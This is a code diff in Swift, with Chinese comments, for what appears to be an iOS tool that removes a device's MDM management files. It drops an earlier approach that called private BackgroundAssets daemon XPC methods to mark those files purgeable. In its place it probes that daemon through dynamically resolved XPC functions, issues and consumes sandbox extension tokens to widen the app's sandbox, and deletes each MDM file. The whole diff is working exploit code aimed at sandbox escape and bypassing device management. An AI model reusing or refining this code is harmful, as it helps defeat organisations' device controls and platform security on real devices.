@@ -34,27 +34,6 @@ enum MDMPath {
     ]
 }
 
-// MARK: - BA XPC 协议（按还原的方法签名声明）
-
-@objc protocol BADownloadManagerSyncProtocol {
-    func syncDownloads(_ downloads: [Any])
-    func removeDownloadIdentifier(_ identifier: String)
-    func downloadIdentifierDidBegin(_ identifier: String)
-    func downloadIdentifierDidPause(_ identifier: String)
-}
-
-@objc protocol BAAgentClientXPCProtocol {
-    func markPurgeable(withFileURL url: URL, sandboxToken: String, reply: @escaping (Bool, Error?) -> Void)
-}
-
-// App 侧回调 stub（BA daemon 会回调这些方法）
-final class BACallbackStub: NSObject, BADownloadManagerSyncProtocol {
-    func syncDownloads(_ downloads: [Any]) { BAPurge.log("(ba) syncDownloads: \(downloads.count)") }
-    func removeDownloadIdentifier(_ identifier: String) { BAPurge.log("(ba) removeDownloadIdentifier: \(identifier)") }
-    func downloadIdentifierDidBegin(_ identifier: String) { BAPurge.log("(ba) didBegin: \(identifier)") }
-    func downloadIdentifierDidPause(_ identifier: String) { BAPurge.log("(ba) didPause: \(identifier)") }
-}
-
 // MARK: - 主逻辑
 
 final class BAPurge {
@@ -116,30 +95,26 @@ final class BAPurge {
 
     // MARK: XPC 到 BA daemon
 
-    private func callBAMarkPurgeable(fileURL: URL, token: String) {
-        let serviceName = "com.apple.backgroundassets.user"
-        let conn = NSXPCConnection(machServiceName: serviceName)
-        conn.remoteObjectInterface = NSXPCInterface(with: BAAgentClientXPCProtocol.self)
-        conn.exportedInterface = NSXPCInterface(with: BADownloadManagerSyncProtocol.self)
-        conn.exportedObject = BACallbackStub()
-        conn.invalidationHandler = { BAPurge.log("(xpc) 连接失效") }
-        conn.interruptionHandler  = { BAPurge.log("(xpc) 连接中断") }
-        conn.resume()
 
-        let proxy = conn.remoteObjectProxyWithErrorHandler { err in
-            BAPurge.log("(xpc) 错误: \(err)")
-        } as? BAAgentClientXPCProtocol
+    // MARK: 低级 XPC：探测 BA daemon 可达性
 
-        guard let proxy else {
-            BAPurge.log("(xpc) 无法获得 remoteObjectProxy")
-            return
+    private func probeBADaemon() -> Int32 {
+        guard let create: XPCConnCreateFn = sym("xpc_connection_create_mach_service") else {
+            BAPurge.log("(xpc) 未找到 xpc_connection_create_mach_service")
+            return -1
         }
-
-        BAPurge.log("(xpc) 调用 markPurgeableWithFileURL: \(fileURL.path)")
-        proxy.markPurgeable(withFileURL: fileURL, sandboxToken: token) { ok, err in
-            if let err { BAPurge.log("(xpc) markPurgeable 失败: \(err)") }
-            else       { BAPurge.log("(xpc) markPurgeable 返回 ok=\(ok)") }
+        guard let conn = create("com.apple.backgroundassets.user", nil, 0) else {
+            BAPurge.log("(xpc) 创建连接失败")
+            return -1
         }
+        if let resume: XPCResumeFn = sym("xpc_connection_resume") { resume(conn) }
+        if let getpid: XPCGetPidFn = sym("xpc_connection_get_pid") {
+            let pid = getpid(conn)
+            BAPurge.log("(xpc) BA daemon PID = \(pid)")
+            return pid
+        }
+        BAPurge.log("(xpc) 连接已建立（无法取 PID）")
+        return 0
     }
 
     // MARK: 内存压力（触发系统回收 purgeable 文件）
@@ -180,13 +155,16 @@ final class BAPurge {
             BAPurge.log("(mdm) 操作前 \(f): \(fm.fileExists(atPath: p) ? "存在" : "不存在")")
         }
 
-        // 逐个标记 purgeable
+        // 逐个文件：签发 token -> consume 扩大沙箱 -> 尝试删除
         for f in MDMPath.files {
             let p = (MDMPath.dir as NSString).appendingPathComponent(f)
             guard fm.fileExists(atPath: p) else { continue }
-            let url = URL(fileURLWithPath: p)
-            if let t = issueToken(path: p) {
-                callBAMarkPurgeable(fileURL: url, sandboxToken: t)
+            if let t = issueToken(path: p) { consume(t) }
+            do {
+                try fm.removeItem(atPath: p)
+                BAPurge.log("(mdm) 已删除 \(f) ✓")
+            } catch {
+                BAPurge.log("(mdm) 删除 \(f) 失败: \(error.localizedDescription)")
             }
         }
 
